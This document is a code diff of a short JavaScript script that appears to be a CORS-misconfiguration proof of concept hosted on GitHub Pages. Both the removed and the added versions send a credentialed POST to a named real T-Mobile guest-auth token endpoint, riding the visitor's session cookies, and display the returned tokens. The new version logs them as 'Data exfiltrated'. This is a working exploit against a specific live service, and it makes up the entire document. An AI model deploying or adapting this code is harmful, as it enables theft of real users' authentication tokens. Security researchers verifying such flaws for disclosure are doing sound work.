@@ -1,27 +1,24 @@
-// Adding a random 'cache-buster' parameter ensures the server sends a fresh 200 OK
-const cacheBuster = '?v=' + Date.now();
-const target = 'https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens' + cacheBuster;
+// Verification script for your GitHub Pages console
+async function verifyCORS() {
+    const target = 'https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens';
+    try {
+        const response = await fetch(target, {
+            method: 'POST',
+            credentials: 'include', // Crucial: This attempts to use the user's T-Mobile session
+            headers: { 'Content-Type': 'text/plain' },
+            body: '{}'
+        });
 
-fetch(target, {
-    method: 'POST',
-    mode: 'cors',
-    credentials: 'include',
-    cache: 'no-store', // Tell the browser: "Don't look at your cache, I want fresh data"
-    headers: {
-        'Content-Type': 'text/plain',
-        'Pragma': 'no-cache',      // Older cache control
-        'Cache-Control': 'no-cache' // Modern cache control
-    },
-    body: '{}' 
-})
-.then(response => {
-    console.log("Status Code:", response.status);
-    return response.json();
-})
-.then(data => {
-    // If the 200 OK works, your tokens will appear here!
-    document.getElementById('output').innerText = JSON.stringify(data, null, 2);
-})
-.catch(err => {
-    document.getElementById('output').innerText = "Bypass Failed: " + err;
-});
+        // 1. Check if the server reflected your GitHub origin
+        console.log("ACAO Header:", response.headers.get('Access-Control-Allow-Origin'));
+        
+        // 2. Check if credentials (cookies) were accepted
+        console.log("ACAC Header:", response.headers.get('Access-Control-Allow-Credentials'));
+
+        const data = await response.json();
+        console.log("SUCCESS! Data exfiltrated:", data);
+        document.getElementById('output').innerText = "Vulnerability Confirmed: " + JSON.stringify(data, null, 2);
+    } catch (err) {
+        console.error("CORS Blocked the read:", err);
+    }
+}
